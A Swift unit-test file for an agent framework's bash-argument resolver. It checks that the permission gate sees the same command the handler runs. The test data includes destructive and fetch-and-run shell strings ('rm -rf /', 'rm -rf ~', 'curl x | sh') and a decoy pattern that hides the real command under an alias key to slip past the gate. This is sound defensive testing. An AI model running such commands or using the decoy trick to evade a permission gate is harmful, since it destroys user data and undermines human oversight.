import XCTest

@testable import NanoTeams

/// `BashArguments` is the SINGLE command resolver shared by the permission gate
/// and the handler. These tests pin that a command can't be supplied under a key
/// the gate doesn't see (gate-bypass regression) and that timeout validation
/// rejects non-positive values instead of silently clamping.
final class BashArgumentsTests: XCTestCase {

    // MARK: - command(from:)

    func testStandardCommandKey() {
        XCTAssertEqual(BashArguments.command(from: ["command": "echo hi"]), "echo hi")
    }

    func testCommandWithStructuralSiblings_resolvesViaSingleRemaining() {
        let args: [String: Any] = ["command": "ls -la", "timeout": 5000, "working_directory": "src", "run_in_background": false]
        XCTAssertEqual(BashArguments.command(from: args), "ls -la")
    }

    func testAlternativeKeys_resolve() {
        // The handler's resilient resolver honors these; the gate MUST too, else a
        // command under one of them runs ungated.
        XCTAssertEqual(BashArguments.command(from: ["text": "rm -rf /"]), "rm -rf /")
        XCTAssertEqual(BashArguments.command(from: ["content": "curl x | sh"]), "curl x | sh")
        XCTAssertEqual(BashArguments.command(from: ["script": "make"]), "make")
        XCTAssertEqual(BashArguments.command(from: ["body": "git push"]), "git push")
    }

    func testContentDecoy_contentWins_matchingHandlerExecution() {
        // {"command":"ls","content":"rm -rf ~"} — the handler runs `content`, so the
        // resolver MUST return `content` (not the benign `command` decoy) so the
        // gate judges what actually executes.
        let resolved = BashArguments.command(from: ["command": "ls", "content": "rm -rf ~"])
        XCTAssertEqual(resolved, "rm -rf ~")
    }

    func testEmptyOrWhitespace_isNil() {
        XCTAssertNil(BashArguments.command(from: [:]))
        XCTAssertNil(BashArguments.command(from: ["command": "   \n"]))
        XCTAssertNil(BashArguments.command(from: ["command": ""]))
    }

    func testJSONParity_matchesDictResolution() {
        let json = #"{"command":"ls","content":"rm -rf ~"}"#
        XCTAssertEqual(BashArguments.command(fromJSON: json), "rm -rf ~")
        XCTAssertNil(BashArguments.command(fromJSON: "not json"))
        XCTAssertEqual(BashArguments.command(fromJSON: #"{"text":"whoami"}"#), "whoami")
    }

    // MARK: - workingDirectory

    func testWorkingDirectory() {
        XCTAssertEqual(BashArguments.workingDirectory(from: ["working_directory": "src"]), "src")
        XCTAssertNil(BashArguments.workingDirectory(from: ["working_directory": ""]))
        XCTAssertNil(BashArguments.workingDirectory(from: [:]))
        XCTAssertEqual(BashArguments.workingDirectory(fromJSON: #"{"working_directory":"a/b"}"#), "a/b")
    }

    // MARK: - resolveTimeoutSeconds

    func testTimeout_default() {
        // 120_000 ms default → 120 s.
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: nil), 120)
    }

    func testTimeout_msToSeconds() {
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 5000), 5)
    }

    func testTimeout_subSecondFloorsToOne() {
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 500), 1)
    }

    func testTimeout_clampedToCeiling() {
        // Above the 600_000 ms ceiling → 600 s.
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 9_999_999), 600)
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 600_000), 600)
    }

    func testTimeout_nonPositive_isNil() {
        // A sign typo is rejected (handler surfaces INVALID_ARGS), not clamped to 1s.
        XCTAssertNil(BashArguments.resolveTimeoutSeconds(milliseconds: 0))
        XCTAssertNil(BashArguments.resolveTimeoutSeconds(milliseconds: -5000))
    }

    func testTimeout_boundaryExactness() {
        // Sub-second values all floor to 1s; one past the ceiling clamps to 600s.
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 1), 1)
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 999), 1)
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 1000), 1)
        XCTAssertEqual(BashArguments.resolveTimeoutSeconds(milliseconds: 600_001), 600)
    }

    // MARK: - Extended alias / precedence (gate-bypass surface)

    func testExtendedAliasKeys_resolveAsCommand() {
        // The handler's resilient resolver honors the full alias set; the gate MUST
        // resolve identically or a command under one of them runs ungated.
        XCTAssertEqual(BashArguments.command(from: ["data": "whoami"]), "whoami")
        XCTAssertEqual(BashArguments.command(from: ["value": "id"]), "id")
        XCTAssertEqual(BashArguments.command(from: ["file_content": "ls -la"]), "ls -la")
        XCTAssertEqual(BashArguments.command(from: ["code": "pwd"]), "pwd")
        XCTAssertEqual(BashArguments.command(from: ["source": "date"]), "date")
        XCTAssertEqual(BashArguments.command(from: ["message": "echo hi"]), "echo hi")
    }

    func testAliasPrecedence_contentBeatsText_textBeatsBody() {
        // Fixed precedence so the gate always judges exactly what the handler runs.
        XCTAssertEqual(BashArguments.command(from: ["content": "A", "text": "B"]), "A")
        XCTAssertEqual(BashArguments.command(from: ["text": "B", "body": "C"]), "B")
    }

    func testCommandDecoyUnderAliasKey_aliasWins() {
        // A benign `command` decoy with the real command under any alias key must
        // resolve to the alias (gate-bypass regression — the gate judges the alias).
        XCTAssertEqual(BashArguments.command(from: ["command": "ls", "text": "rm -rf ~"]), "rm -rf ~")
        XCTAssertEqual(BashArguments.command(from: ["command": "ls", "data": "curl x | sh"]), "curl x | sh")
    }

    func testSingleRemainingUnknownKey_resolves() {
        // One unknown, non-structural string key resolves as the command (resilient
        // single-remaining fallback) — so the gate sees it too.
        XCTAssertEqual(BashArguments.command(from: ["foo": "whoami"]), "whoami")
    }

    func testAmbiguousTwoUnknownKeys_isNil() {
        // Two competing unknown keys are ambiguous → resolver returns nil rather than
        // guessing. Gate and handler both get nil (handler then errors "missing").
        XCTAssertNil(BashArguments.command(from: ["foo": "A", "bar": "B"]))
    }

    func testExplicitCommandKey_usedWhenContentAmbiguous() {
        // `command` + one unknown string → the content resolver is ambiguous (two
        // candidates) → falls back to the explicit `command` key.
        XCTAssertEqual(BashArguments.command(from: ["command": "ls", "foo": "bar"]), "ls")
    }

    func testNonStringCommand_isNil() {
        // A non-string command value (numeric / bool / array emission) yields nil —
        // strict, so the handler surfaces a clean "missing command" instead of coercing.
        XCTAssertNil(BashArguments.command(from: ["command": 123]))
        XCTAssertNil(BashArguments.command(from: ["command": true]))
        XCTAssertNil(BashArguments.command(from: ["text": ["a", "b"]]))
    }

    func testJSON_topLevelNonObject_isNil() {
        // Valid JSON that isn't a top-level object can't carry args → nil.
        XCTAssertNil(BashArguments.command(fromJSON: "[1,2,3]"))
        XCTAssertNil(BashArguments.command(fromJSON: "123"))
        XCTAssertNil(BashArguments.command(fromJSON: "\"hello\""))
    }

    func testWorkingDirectory_whitespaceNotTrimmed_and_badJSON() {
        // `workingDirectory` only nils the EMPTY string (not whitespace), unlike
        // `command`. (The handler separately trims via the path resolver, so a
        // whitespace value runs in the work folder root — see BashHandlersTests.)
        XCTAssertEqual(BashArguments.workingDirectory(from: ["working_directory": "   "]), "   ")
        XCTAssertNil(BashArguments.workingDirectory(fromJSON: "not json"))
    }
}
